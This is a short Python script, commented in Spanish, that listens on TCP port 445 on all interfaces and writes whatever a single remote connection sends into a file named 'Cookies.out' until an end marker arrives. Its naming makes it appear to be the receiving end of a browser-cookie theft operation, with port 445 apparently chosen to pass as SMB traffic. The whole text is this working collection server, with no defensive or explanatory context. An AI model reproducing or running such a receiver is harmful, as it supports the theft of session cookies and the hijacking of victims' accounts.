import socket

LHOST = "0.0.0.0"
LPORT = 445
BUFFER = 1000
OUTNAME = "Cookies.out"
CLOSESTR = "TT2019B102"

try:
	f = open(OUTNAME, 'wb')
except IOError as e:
	raise e

fd = socket.socket()
print("Escuchando en {} puerto {}.".format(LHOST, LPORT))
fd.bind((LHOST, LPORT))
fd.listen()
remote, raddr = fd.accept()
print("Conexion desde: {}\nRecibiendo datos...".format(raddr))
while True:
	dat = remote.recv(BUFFER)
	if bytes(CLOSESTR, encoding='utf-8') in dat:
		print("Finalizando...")
		remote.close()
		break
	#print(dat)
	f.write(dat)
fd.close()
print("Finalizado")
